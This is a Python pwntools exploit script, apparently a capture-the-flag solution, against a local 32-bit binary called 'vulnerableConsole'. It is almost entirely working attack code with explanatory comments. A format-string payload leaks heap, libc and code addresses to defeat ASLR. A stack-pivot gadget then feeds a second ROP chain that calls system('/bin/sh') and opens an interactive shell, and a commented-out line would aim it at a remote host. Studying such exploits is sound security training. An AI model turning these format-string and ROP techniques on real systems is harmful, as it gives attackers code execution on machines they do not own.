from pwn import *

fileName = './vulnerableConsole'
context.binary = fileName
e = ELF(fileName)
libc = ELF('./libc.so.6')
## .got + .sym + .plt are all valid methods to get an address
#putsAdd = e.got['puts']



## to test locally use process, otherwise remote in 
p = process(fileName)
context.terminal = ['ptyxis', '--', 'sh', '-c']
# for use with gdb
#p = gdb.debug(fileName, gdbscript='''r''',env={"SHELL": "/bin/sh"})
#p = remote(ip,port)



# 6%p = description / heap leak 7%p = libc leak 3%p = code leak
p.recvuntil(b'Exit\n')
p.sendline(b'settings uptime %6$p %7$p %3$p')
p.sendline(b'info uptime\n')
p.recvuntil(b'updated.\n> ')

leaks = p.recvline().decode()
leakedAddresses = leaks.split()
descriptionLeak = leakedAddresses[0]
libcLeak = leakedAddresses[1] 
codeLeak = leakedAddresses[2].partition('>')[0]# removes that >

print(f"Desc / Heap leak = {descriptionLeak} libcLeak = {libcLeak} codeLeak = {codeLeak}")

stdinOffset = 0x1F75C0
codeOffset = 0x5b6
# I did this manually but pwntools can also do this
libc.address = int(libcLeak,16) - libc.sym['_IO_2_1_stdin_']
libcBase = int(libcLeak,16) - stdinOffset
codeBase = int(codeLeak,16) - codeOffset

print(f"Libc base = {hex(libcBase)} also {hex(libc.address)}")
print(f"Code base = {hex(codeBase)}")

# First rop chain on with sprintf needs to pivot stack pointer to description buffer, then second rop chain to call system with /bin/sh
# We need to build the second rop chain first
popEbx = codeBase + 0x000001f6
makeAStack = codeBase + 0x0000047d # add esp, 0x400; ret
# Pwntool doing the rebasing for us, you can also do this manually easily enough
system  = libc.sym['system']
exit_f  = libc.sym['exit']
binsh   = next(libc.search(b'/bin/sh'))



print(f"popEbx = {hex(popEbx)} makeAStack = {hex(makeAStack)}")
print(f"system = {hex(system)} exit = {hex(exit_f)} binsh = {hex(binsh)}")


secondRopChain = b'settings description '

# x86-32 uses the stack to pass parameters so we actually don't need to worry about gadgets to pop int edi etc 
secondRopChain += p32(popEbx) # Ebx was clobbered so we need to pop something into it to avoid crashing when we call system, it doesn't matter what we pop into it
secondRopChain += p32(e.got['printf'])
secondRopChain += p32(makeAStack) # allow enough space to make a stack frame for system, esp + 0x400
secondRopChain += b'A'*0x400 # padding to get to the rest of the rop chain 
secondRopChain += p32(system)
secondRopChain += p32(exit_f)
secondRopChain += p32(binsh)


p.sendline(secondRopChain)

# Now the first small rop chain to go to the second rop chain, stack pivot
p.sendline(b'query AAAAAAAABBBBBBBBCCCCC' + p32(int(descriptionLeak,16)-4) + p32(codeBase+0x00000341))







p.interactive()
